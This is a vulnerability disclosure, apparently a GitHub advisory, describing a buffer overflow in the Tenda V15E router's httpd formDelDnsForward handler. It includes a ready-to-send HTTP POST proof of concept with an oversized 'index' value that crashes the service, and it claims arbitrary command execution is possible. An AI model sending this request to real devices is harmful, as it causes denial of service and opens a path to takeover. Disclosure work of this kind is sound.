## Tenda V15EV1.0 found a buffer overflow vulnerability in the "index" parameter of the "formDelDnsForward" function

### Vendor:

​	Tenda

### Product:

​	V15EV1.0

### Vendor Homepage:

​	https://www.tenda.com.cn/

### Firmware:

​	https://www.tenda.com.cn/download/detail-2722.html

### Version:

​	V15.11.0.14(1521_3190_1058)

## Vulnerability details

The vulnerability is in the `"formDelDnsForward"` function in the `/bin/httpd` file

​	![image](https://user-images.githubusercontent.com/76503635/219949336-768ea771-c5ec-49d8-b60a-cc3f28cf8e98.png)

`"indexSet"` receives the transmitted parameters, does not verify its length. causes a buffer overflow vulnerability due to the use of `strcpy()`

## POC

```http
POST /goform/delDNSForward HTTP/1.1
Host: 192.168.75.201
Content-Length: 85
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.75.201
Referer: http://192.168.75.201/quickset/quickset.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: W15E_user=
Connection: close

index=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Start httpd using qemu

![image](https://user-images.githubusercontent.com/76503635/219949543-bdff9486-c99c-466e-9420-c07f21a6d6d7.png)
![image](https://user-images.githubusercontent.com/76503635/219949602-a3d017cd-26e3-44a6-b32d-eb92eeb615c3.png)


DOS caused by sending request

![image](https://user-images.githubusercontent.com/76503635/219949731-d30c150d-36ac-417d-a774-63c7eed1c75e.png)

And overwrite the return address, an execute arbitrary commands by constructing EXP
